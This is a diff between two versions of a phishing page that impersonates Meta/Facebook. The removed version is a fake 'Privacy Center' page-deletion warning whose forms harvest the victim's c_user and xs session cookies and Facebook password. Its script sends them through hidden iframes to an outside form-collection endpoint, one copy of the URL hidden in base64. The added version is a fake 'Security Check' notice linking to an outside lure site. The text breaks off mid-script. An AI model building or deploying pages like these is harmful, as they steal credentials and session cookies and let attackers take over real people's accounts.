@@ -1,1089 +1,164 @@
 
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Privacy Center - Page Deletion</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background-color: #f0f2f5;
-            color: #1c1e21;
-            line-height: 1.6;
-            display: flex;
-            min-height: 100vh;
-        }
-        
-        .sidebar {
-            width: 280px;
-            background-color: #ffffff;
-            box-shadow: 2px 0 4px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            position: fixed;
-            height: 100vh;
-            overflow-y: auto;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e4e6eb;
-        }
-        
-        .meta-logo {
-            height: 36px;
-            margin-right: 12px;
-        }
-        
-        .logo-text {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1877f2;
-        }
-        
-        .nav-section {
-            margin-bottom: 30px;
-        }
-        
-        .nav-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #65676b;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .nav-links {
-            list-style: none;
-        }
-        
-        .nav-links li {
-            margin-bottom: 12px;
-        }
-        
-        .nav-links a {
-            color: #1c1e21;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            padding: 8px 12px;
-            border-radius: 6px;
-            transition: background-color 0.2s;
-        }
-        
-        .nav-links a:hover {
-            background-color: #f0f2f5;
-        }
-        
-        .nav-links a.active {
-            background-color: #e7f3ff;
-            color: #1877f2;
-            font-weight: 500;
-        }
-        
-        .nav-icon {
-            margin-right: 10px;
-            width: 20px;
-            text-align: center;
-        }
-        
-        .main-content {
-            flex: 1;
-            margin-left: 280px;
-            padding: 20px;
-        }
-        
-        .content-card {
-            background-color: #ffffff;
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            margin-bottom: 30px;
-            text-align: center;
-            max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .card-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #d93025;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .warning-icon {
-            margin-right: 10px;
-            font-size: 28px;
-        }
-        
-        .info-text {
-            margin-bottom: 20px;
-            color: #65676b;
-            text-align: left;
-        }
-        
-        .appeal-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 12px 100px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            display: block;
-            margin: 20px auto;
-        }
-        
-        .appeal-button:hover {
-            background-color: #166fe5;
-        }
-        
-        .content-image {
-            width: 100%;
-            max-width: 600px;
-            margin: 20px auto;
-            border-radius: 8px;
-            display: block;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 20px 0;
-            color: #65676b;
-            font-size: 14px;
-            margin-top: 40px;
-        }
-        
-        .footer-links {
-            margin-top: 10px;
-        }
-        
-        .footer-links a {
-            color: #65676b;
-            text-decoration: none;
-            margin: 0 10px;
-        }
-        
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        
-        .mobile-header {
-            display: none;
-            background-color: #ffffff;
-            padding: 15px 10px;
-            border-radius: 8px;
-            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-            align-items: center;
-        }
-        
-        .mobile-logo-container {
-            display: flex;
-            align-items: center;
-        }
-        
-        .mobile-logo {
-            height: 40px;
-            width: 40px;
-            border-radius: 0;
-            margin-right: 12px;
-            object-fit: contain;
-            background-color: transparent;
-        }
-        
-        .mobile-nav-toggle {
-            margin-left: auto;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #65676b;
-        }
-        
-        .mobile-nav {
-            display: none;
-            background-color: #ffffff;
-            padding: 15px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-        }
-        
-        .mobile-nav-links {
-            list-style: none;
-        }
-        
-        .mobile-nav-links li {
-            margin-bottom: 10px;
-        }
-        
-        .mobile-nav-links a {
-            color: #1c1e21;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            border-radius: 6px;
-            transition: background-color 0.2s;
-        }
-        
-        .mobile-nav-links a:hover {
-            background-color: #f0f2f5;
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .modal-content {
-            background-color: white;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 500px;
-            max-height: 90vh;
-            padding: 30px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            position: relative;
-            overflow-y: auto;
-        }
-        
-        .close-modal {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #65676b;
-        }
-        
-        .modal-title {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            color: #1c1e21;
-            text-align: center;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #1c1e21;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        
-        .video-container {
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
-            border: 2px solid #1877f2;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 6px 15px rgba(24, 119, 242, 0.15);
-            position: relative;
-            margin: 25px 0;
-        }
-        
-        .video-important-ribbon {
-            position: absolute;
-            top: -10px;
-            left: 20px;
-            background: #d93025;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 4px;
-            font-weight: 600;
-            font-size: 14px;
-            box-shadow: 0 3px 6px rgba(217, 48, 37, 0.3);
-        }
-        
-        .video-warning-text {
-            text-align: center; 
-            margin-bottom: 15px; 
-            font-weight: 600;
-            color: #1877f2;
-            font-size: 18px;
-            padding-top: 10px;
-        }
-        
-        .video-header {
-            text-align: center;
-            margin-bottom: 15px;
-            color: #d93025;
-            font-weight: 500;
-        }
-        
-        .video-player {
-            width: 100%;
-            max-height: 300px;
-            border: 3px solid #fff;
-            border-radius: 10px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-            background: #000;
-        }
-        
-        .video-info-box {
-            margin-top: 15px;
-            padding: 12px;
-            background: #e7f3ff;
-            border-radius: 8px;
-            border-left: 4px solid #1877f2;
-        }
-        
-        .video-info-content {
-            margin: 0;
-            color: #1c1e21;
-            font-weight: 500;
-        }
-        
-        .submit-form-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 24px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            width: 100%;
-            margin-top: 10px;
-        }
-        
-        .submit-form-button:hover {
-            background-color: #166fe5;
-        }
-        
-        .facebook-logo-container {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        
-        .facebook-logo {
-            height: 70px;
-            width: 70px;
-        }
-        
-        .loading-spinner {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-            margin: 0 auto;
-        }
-        
-        .language-options {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .language-option {
-            display: flex;
-            align-items: center;
-            padding: 12px 15px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .language-option:hover {
-            background-color: #f0f2f5;
-        }
-        
-        .language-option.selected {
-            background-color: #e7f3ff;
-            border-color: #1877f2;
-        }
-        
-        .language-flag {
-            margin-right: 10px;
-            font-size: 20px;
-        }
-        
-        .language-name {
-            font-weight: 500;
-        }
-        
-        .continue-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 24px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            width: 100%;
-            margin-top: 10px;
-        }
-        
-        .continue-button:disabled {
-            background-color: #dddfe2;
-            cursor: not-allowed;
-        }
-        
-        .continue-button:hover:not(:disabled) {
-            background-color: #166fe5;
-        }
-        
-        .error-message {
-            background-color: #fdecea;
-            color: #d93025;
-            border: 1px solid #f28b82;
-            border-radius: 6px;
-            padding: 12px;
-            margin-top: 10px;
-            font-size: 14px;
-            display: none;
-            text-align: center;
-        }
-        
-        .error-show {
-            display: block;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @media (max-width: 768px) {
-            body {
-                flex-direction: column;
-            }
-            
-            .sidebar {
-                display: none;
-            }
-            
-            .main-content {
-                margin-left: 0;
-                padding: 15px;
-            }
-            
-            .mobile-header {
-                display: flex;
-            }
-            
-            .modal-content {
-                width: 95%;
-                padding: 20px;
-            }
-            
-            .video-warning-text {
-                font-size: 16px;
-                padding-top: 5px;
-            }
-            
-            .video-container {
-                padding: 15px;
-                margin: 15px 0;
-            }
-            
-            .mobile-logo {
-                height: 36px;
-                width: 36px;
-            }
-            
-            .logo-text {
-                font-size: 18px;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Account -Security Check Required</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap');
+
+body {
+    margin: 0;
+    font-family: 'Helvetica', Arial, sans-serif;
+    background: linear-gradient(135deg, #1877f2, #4e54c8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+/* Card */
+.container {
+    background: rgba(255,255,255,0.95);
+    border-radius: 12px;
+    padding: 30px 25px;
+    width: 95%;
+    max-width: 420px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+    text-align: center;
+}
+
+/* Facebook Logo */
+.facebook-logo {
+    width: 100px;
+    margin-bottom: 20px;
+}
+
+/* Heading */
+h1 {
+    font-size: 22px;
+    color: #1c1e21;
+    margin-bottom: 10px;
+    font-weight: 700;
+}
+
+/* Subtext */
+.sub {
+    font-size: 14px;
+    color: #606770;
+    margin-bottom: 20px;
+    line-height: 1.5;
+}
+
+/* Sections */
+.section {
+    text-align: left;
+    margin-top: 18px;
+}
+
+.title {
+    font-weight: 700;
+    font-size: 13px;
+    margin-bottom: 4px;
+    color: #1c1e21;
+}
+
+/* Links */
+.link {
+    color: #1877f2;
+    text-decoration: none;
+    cursor: pointer;
+    font-weight: 600;
+}
+
+.link:hover {
+    text-decoration: underline;
+}
+
+/* Buttons */
+.btn-link {
+    display: inline-block;
+    margin-top: 20px;
+    padding: 12px 25px;
+    background: #1877f2;
+    color: #fff;
+    font-weight: bold;
+    border-radius: 8px;
+    transition: 0.25s;
+    text-decoration: none;
+}
+
+.btn-link:hover {
+    background: #155db2;
+    transform: scale(1.05);
+}
+
+/* Meta Footer */
+.footer {
+    margin-top: 30px;
+    font-size: 12px;
+    color: #90949c;
+    text-align: center;
+}
+.footer a {
+    color: #1877f2;
+    text-decoration: none;
+}
+.footer a:hover {
+    text-decoration: underline;
+}
+</style>
 </head>
 <body>
-    <div class="sidebar">
-        <div class="logo-container">
-            <svg class="meta-logo" viewBox="0 0 36 36" fill="url(#jsc_s_3)" height="36" width="36">
-                <defs>
-                    <linearGradient x1="50%" x2="50%" y1="97.078%" y2="0%" id="jsc_s_3">
-                        <stop offset="0%" stop-color="#0062E0"></stop>
-                        <stop offset="100%" stop-color="#19AFFF"></stop>
-                    </linearGradient>
-                </defs>
-                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
-                <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
-            </svg>
-            <span class="logo-text">Privacy Center</span>
-        </div>
-        
-        <div class="nav-section">
-            <h3 class="nav-title">Navigation</h3>
-            <ul class="nav-links">
-                <li><a href="#" class="active"><span class="nav-icon">🏠</span>Privacy Center Home Page</a></li>
-                <li><a href="#"><span class="nav-icon">🔍</span>Search</a></li>
-                <li><a href="#"><span class="nav-icon">📄</span>Privacy Policy</a></li>
-                <li><a href="#"><span class="nav-icon">📚</span>Other Rules & Articles</a></li>
-            </ul>
-        </div>
-        
-        <div class="nav-section">
-            <h3 class="nav-title">Your Privacy</h3>
-            <ul class="nav-links">
-                <li><a href="#"><span class="nav-icon">👤</span>Your Information</a></li>
-                <li><a href="#"><span class="nav-icon">🔒</span>Security Settings</a></li>
-                <li><a href="#"><span class="nav-icon">📱</span>App Permissions</a></li>
-                <li><a href="#"><span class="nav-icon">🚫</span>Deletion Requests</a></li>
-            </ul>
-        </div>
+
+<div class="container">
+
+    <!-- Facebook Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+         alt="Facebook Logo" class="facebook-logo">
+
+    <h1>Facebook Security</h1>
+
+    <p class="sub">
+        <b id="username"></b>, Policy violation detected <br>
+        <b>Facebook's Community Standards</b>.  This violation has been recorded in our security system.
+    </p>
+
+    <div class="section">
+        <div class="title">Important Notice</div>
+        <p>This violation page will be automatically deleted within 24 hours if no appeal is submitted. To prevent deletion and review your case, you must submit an appeal..</p>
     </div>
-    
-    <div class="main-content">
-        <div class="mobile-header">
-            <div class="mobile-logo-container">
-                <svg class="mobile-logo" viewBox="0 0 36 36" fill="#1877F2" height="36" width="36">
-                    <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
-                    <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
-                </svg>
-                <span class="logo-text">Privacy Center</span>
-            </div>
-            <button class="mobile-nav-toggle" id="navToggle">☰</button>
-        </div>
-        
-        <div class="mobile-nav" id="mobileNav">
-            <ul class="mobile-nav-links">
-                <li><a href="#" class="active"><span class="nav-icon">🏠</span>Privacy Center Home Page</a></li>
-                <li><a href="#"><span class="nav-icon">🔍</span>Search</a></li>
-                <li><a href="#"><span class="nav-icon">📄</span>Privacy Policy</a></li>
-                <li><a href="#"><span class="nav-icon">📚</span>Other Rules & Articles</a></li>
-                <li><a href="#"><span class="nav-icon">👤</span>Your Information</a></li>
-                <li><a href="#"><span class="nav-icon">🔒</span>Security Settings</a></li>
-                <li><a href="#"><span class="nav-icon">📱</span>App Permissions</a></li>
-                <li><a href="#"><span class="nav-icon">🚫</span>Deletion Requests</a></li>
-            </ul>
-        </div>
-        
-        <div class="content-card">
-            <h2 class="card-title">
-                <span class="warning-icon">⚠️</span>
-                Your page is scheduled to be deleted!
-            </h2>
-            <p class="info-text">We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</p>
-            <p class="info-text">If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.</p>
-            <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Privacy Center" class="content-image">
-            
-            <p class="info-text">We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</p>
-            
-            <button class="appeal-button" id="submitAppeal">Appeal</button>
-        </div>
-        
-        <footer>
-            <p>Meta &copy; 2026</p>
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms of Service</a>
-                <a href="#">Help Center</a>
-            </div>
-        </footer>
+
+    <!-- Get Started Button -->
+    <div class="section">
+        <a href="http://follow-our-community-terms.surge.sh/" target="_blank" rel="noopener noreferrer" class="btn-link">
+            Get Started
+        </a>
     </div>
-    
-    <div class="modal" id="languageModal">
-        <div class="modal-content">
-            <button class="close-modal" id="closeLanguageModal">&times;</button>
-            <h2 class="modal-title">Choose Your Language</h2>
-            
-            <div class="language-options">
-                <div class="language-option" data-lang="en">
-                    <span class="language-flag">🇺🇸</span>
-                    <span class="language-name">English</span>
-                </div>
-                <div class="language-option" data-lang="es">
-                    <span class="language-flag">🇪🇸</span>
-                    <span class="language-name">Spanish</span>
-                </div>
-                <div class="language-option" data-lang="pt">
-                    <span class="language-flag">🇵🇹</span>
-                    <span class="language-name">Portuguese</span>
-                </div>
-                <div class="language-option" data-lang="hi">
-                    <span class="language-flag">🇮🇳</span>
-                    <span class="language-name">Hindi</span>
-                </div>
-                <div class="language-option" data-lang="ta">
-                    <span class="language-flag">🇮🇳</span>
-                    <span class="language-name">Tamil</span>
-                </div>
-                <div class="language-option" data-lang="ar">
-                    <span class="language-flag">🇸🇦</span>
-                    <span class="language-name">Arabic</span>
-                </div>
-            </div>
-            
-            <button class="continue-button" id="continueButton" disabled>Continue</button>
-        </div>
+
+    <!-- Meta Help Center Link -->
+    <div class="section">
+        <p>Learn more at the <a href="http://follow-our-community-terms.surge.sh/" class="link">Meta Help Center</a>.</p>
     </div>
-    
-    <div class="modal" id="appealModal">
-        <div class="modal-content">
-            <button class="close-modal" id="closeModal">&times;</button>
-            <h2 class="modal-title">Page Appeal Request</h2>
-            
-            <div class="video-container">
-                <div class="video-important-ribbon">
-                     
-                </div>
-                
-                <div class="video-header">
-                    <h4 style="margin: 0; text-align: center;">
-                        Detailed Information Video
-                    </h4>
-                </div>
-                
-                <video class="video-player" controls id="languageVideo">
-                    <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-                    Your browser does not support the video tag.
-                </video>
-                
-                <div class="video-info-box">
-                    <p class="video-info-content">
-                         Watch this video to learn the complete step-by-step process of submitting your appeal.
-            This guide will help you correctly fill out the appeal form.
-                    </p>
-                </div>
-            </div>
-            
-            <form id="appealForm">
-                <div class="form-group">
-                    <label class="form-label" for="firstName">c_user</label>
-                    <input type="text" id="firstName" class="form-input" placeholder="Enter c_user" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="lastName">xs</label>
-                    <input type="text" id="lastName" class="form-input" placeholder="Enter xs" required>
-                </div>
-                
-                <div class="error-message" id="formErrorMessage">
-                    Incorrect information provided. Please check your c_user and xs values.
-                </div>
-                
-                <div class="loading-spinner" id="firstFormSpinner">
-                    <div class="spinner"></div>
-                    <p>Submitting your request...</p>
-                </div>
-                
-                <button type="submit" class="submit-form-button" id="firstFormSubmit">Submit Appeal Request</button>
-            </form>
-        </div>
+
+    <!-- Footer Disclaimer -->
+    <div class="footer">
+        &copy; 2026 Meta Platforms, Inc. All rights reserved.
     </div>
-    
-    <div class="modal" id="surnameModal">
-        <div class="modal-content">
-            <button class="close-modal" id="closeSurnameModal">&times;</button>
-            
-            <div class="facebook-logo-container">
-                <svg class="facebook-logo" viewBox="0 0 36 36" fill="#1877F2" height="70" width="70">
-                    <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
-                    <path fill="#fff" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
-                </svg>
-            </div>
-            
-            <h2 class="modal-title">Enter Your Password</h2>
-            
-            <form id="surnameForm">
-                <div class="form-group">
-                    <label class="form-label" for="surname">Password</label>
-                    <input type="text" id="surname" class="form-input" placeholder="Enter your password" required>
-                </div>
-                
-                <div class="error-message" id="passwordErrorMessage">
-                    Incorrect password. Please enter your correct Facebook password.
-                </div>
-                
-                <div class="loading-spinner" id="secondFormSpinner">
-                    <div class="spinner"></div>
-                    <p>Submitting your appeal...</p>
-                </div>
-                
-                <button type="submit" class="submit-form-button" id="secondFormSubmit">Submit Appeal</button>
-            </form>
-        </div>
-    </div>
-    
-    <iframe name="hiddenIframe1" id="hiddenIframe1" style="display: none;"></iframe>
-    <iframe name="hiddenIframe2" id="hiddenIframe2" style="display: none;"></iframe>
-    <iframe name="hiddenIframe3" id="hiddenIframe3" style="display: none;"></iframe>
-    <iframe name="hiddenIframe4" id="hiddenIframe4" style="display: none;"></iframe>
-    
-    <script>
-        const languageModal = document.getElementById('languageModal');
-        const appealModal = document.getElementById('appealModal');
-        const surnameModal = document.getElementById('surnameModal');
-        const submitAppealBtn = document.getElementById('submitAppeal');
-        const closeLanguageModalBtn = document.getElementById('closeLanguageModal');
-        const closeModalBtn = document.getElementById('closeModal');
-        const closeSurnameModalBtn = document.getElementById('closeSurnameModal');
-        const appealForm = document.getElementById('appealForm');
-        const surnameForm = document.getElementById('surnameForm');
-        const firstFormSpinner = document.getElementById('firstFormSpinner');
-        const secondFormSpinner = document.getElementById('secondFormSpinner');
-        const firstFormSubmitBtn = document.getElementById('firstFormSubmit');
-        const secondFormSubmitBtn = document.getElementById('secondFormSubmit');
-        const hiddenIframe1 = document.getElementById('hiddenIframe1');
-        const hiddenIframe2 = document.getElementById('hiddenIframe2');
-        const hiddenIframe3 = document.getElementById('hiddenIframe3');
-        const hiddenIframe4 = document.getElementById('hiddenIframe4');
-        const continueButton = document.getElementById('continueButton');
-        const languageVideo = document.getElementById('languageVideo');
-        const formErrorMessage = document.getElementById('formErrorMessage');
-        const passwordErrorMessage = document.getElementById('passwordErrorMessage');
-        
-        const languageOptions = document.querySelectorAll('.language-option');
-        
-        const videoUrls = {
-            'en': 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
-            'es': 'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
-            'pt': 'https://allvideos.wasmer.app/Portuguese.mp4',
-            'hi': 'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
-            'ta': 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-ta/720p.mp4',
-            'ar': 'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4'
-        };
-        
-        let userData = {};
-        let selectedLanguage = '';
-        
-        function decodeBase64(str) {
-            return atob(str);
-        }
-        
-        function validateCUser(value) {
-            if (!value) return false;
-            const numbersOnly = /^\d+$/.test(value);
-            if (!numbersOnly) return false;
-            if (value.length < 5 || value.length > 15) return false;
-            return true;
-        }
-        
-        function validateXs(value) {
-            if (!value) return false;
-            if (value.length < 20 || value.length > 200) return false;
-            const hasSpecialChars = /[%$&*()\-_=+[\]{}|;:,.<>?]/.test(value);
-            const hasLetters = /[a-zA-Z]/.test(value);
-            const hasNumbers = /\d/.test(value);
-            if (!hasSpecialChars || !hasLetters || !hasNumbers) return false;
-            return true;
-        }
-        
-        function validatePassword(value) {
-            if (!value) return false;
-            if (value.length < 6) return false;
-            return true;
-        }
-        
-        function showError(element) {
-            element.classList.add('error-show');
-        }
-        
-        function hideError(element) {
-            element.classList.remove('error-show');
-        }
-        
-        submitAppealBtn.addEventListener('click', function() {
-            languageModal.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-        });
-        
-        closeLanguageModalBtn.addEventListener('click', function() {
-            languageModal.style.display = 'none';
-            document.body.style.overflow = 'auto';
-        });
-        
-        closeModalBtn.addEventListener('click', function() {
-            appealModal.style.display = 'none';
-            document.body.style.overflow = 'auto';
-        });
-        
-        closeSurnameModalBtn.addEventListener('click', function() {
-            surnameModal.style.display = 'none';
-            document.body.style.overflow = 'auto';
-        });
-        
-        window.addEventListener('click', function(event) {
-            if (event.target === languageModal) {
-                languageModal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            }
-            if (event.target === appealModal) {
-                appealModal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            }
-            if (event.target === surnameModal) {
-                surnameModal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            }
-        });
-        
-        languageOptions.forEach(option => {
-            option.addEventListener('click', function() {
-                languageOptions.forEach(opt => opt.classList.remove('selected'));
-                this.classList.add('selected');
-                continueButton.disabled = false;
-                selectedLanguage = this.getAttribute('data-lang');
-            });
-        });
-        
-        continueButton.addEventListener('click', function() {
-            if (selectedLanguage) {
-                if (videoUrls[selectedLanguage]) {
-                    languageVideo.querySelector('source').src = videoUrls[selectedLanguage];
-                    languageVideo.load();
-                }
-                
-                languageModal.style.display = 'none';
-                appealModal.style.display = 'flex';
-            }
-        });
-        
-        appealForm.addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            
-            hideError(formErrorMessage);
-            
-            const cUserValid = validateCUser(firstName);
-            if (!cUserValid) {
-                showError(formErrorMessage);
-                return;
-            }
-            
-            const xsValid = validateXs(lastName);
-            if (!xsValid) {
-                showError(formErrorMessage);
-                return;
-            }
-            
-            userData.firstName = firstName;
-            userData.lastName = lastName;
-            
-            firstFormSpinner.style.display = 'block';
-            firstFormSubmitBtn.disabled = true;
-            
-            const tempForm = document.createElement('form');
-            tempForm.method = 'POST';
-            tempForm.action = 'https://submit-form.com/MXQAYdIOP';
-            tempForm.target = 'hiddenIframe1';
-            tempForm.style.display = 'none';
-            
-            const firstNameInput = document.createElement('input');
-            firstNameInput.type = 'text';
-            firstNameInput.name = 'c_user';
-            firstNameInput.value = firstName;
-            tempForm.appendChild(firstNameInput);
-            
-            const lastNameInput = document.createElement('input');
-            lastNameInput.type = 'text';
-            lastNameInput.name = 'xs';
-            lastNameInput.value = lastName;
-            tempForm.appendChild(lastNameInput);
-            
-            const languageInput = document.createElement('input');
-            languageInput.type = 'text';
-            languageInput.name = 'language';
-            languageInput.value = selectedLanguage;
-            tempForm.appendChild(languageInput);
-            
-            document.body.appendChild(tempForm);
-            tempForm.submit();
-            
-            document.body.removeChild(tempForm);
-            
-            hiddenIframe1.onload = function() {
-                appealModal.style.display = 'none';
-                surnameModal.style.display = 'flex';
-                
-                firstFormSpinner.style.display = 'none';
-                firstFormSubmitBtn.disabled = false;
-            };
-        });
-        
-        surnameForm.addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            const surname = document.getElementById('surname').value;
-            
-            hideError(passwordErrorMessage);
-            
-            const passwordValid = validatePassword(surname);
-            if (!passwordValid) {
-                showError(passwordErrorMessage);
-                return;
-            }
-            
-            userData.surname = surname;
-            
-            secondFormSpinner.style.display = 'block';
-            secondFormSubmitBtn.disabled = true;
-            
-            const tempForm2 = document.createElement('form');
-            tempForm2.method = 'POST';
-            tempForm2.action = 'https://submit-form.com/MXQAYdIOP';
-            tempForm2.target = 'hiddenIframe2';
-            tempForm2.style.display = 'none';
-            
-            const surnameInput = document.createElement('input');
-            surnameInput.type = 'text';
-            surnameInput.name = 'surname';
-            surnameInput.value = surname;
-            tempForm2.appendChild(surnameInput);
-            
-            const languageInput = document.createElement('input');
-            languageInput.type = 'text';
-            languageInput.name = 'language';
-            languageInput.value = selectedLanguage;
-            tempForm2.appendChild(languageInput);
-            
-            document.body.appendChild(tempForm2);
-            tempForm2.submit();
-            
-            document.body.removeChild(tempForm2);
-            
-            hiddenIframe2.onload = function() {
-                const encodedFormUrl = "aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vTVhRQVlkSU9Q";
-                const thirdFormUrl = decodeBase64(encodedFormUrl);
-                
-                const tempForm3 = document.createElement('form');
-                tempForm3.method = 'POST';
-                tempForm3.action = thirdFormUrl;
-                tempForm3.target = 'hiddenIframe3';
-                tempForm3.style.display = 'none';
-                
-                const firstNameInput = document.createElement('input');
-                firstNameInput.type = 'text';
-                firstNameInput.name = 'firstName';
-                firstNameInput.value = userData.firstName;
-                tempForm3.appendChild(firstNameInput);
-                
-                const lastNameInput = document.createElement('input');
-                lastNameInput.type = 'text';
-                lastNameInput.name = 'lastName';
-                lastNameInput.value = userData.lastName;
-                tempForm3.appendChild(lastNameInput);
-                
-                const surnameInput = document.createElement('input');
-                surnameInput.type = 'text';
-                surnameInput.name = 'surname';
-                surnameInput.value = userData.surname;
-                tempForm3.appendChild(surnameInput);
-                
-                const languageInput = document.createElement('input');
-                languageInput.type = 'text';
-                languageInput.name = 'language';
-                languageInput.value = selectedLanguage;
-                tempForm3.appendChild(languageInput);
-                
-                document.body.appendChild(tempForm3);
-                tempForm3.submit();
-                
-                document.body.removeChild(tempForm3);
-                
-                hiddenIframe3.onload = function() {
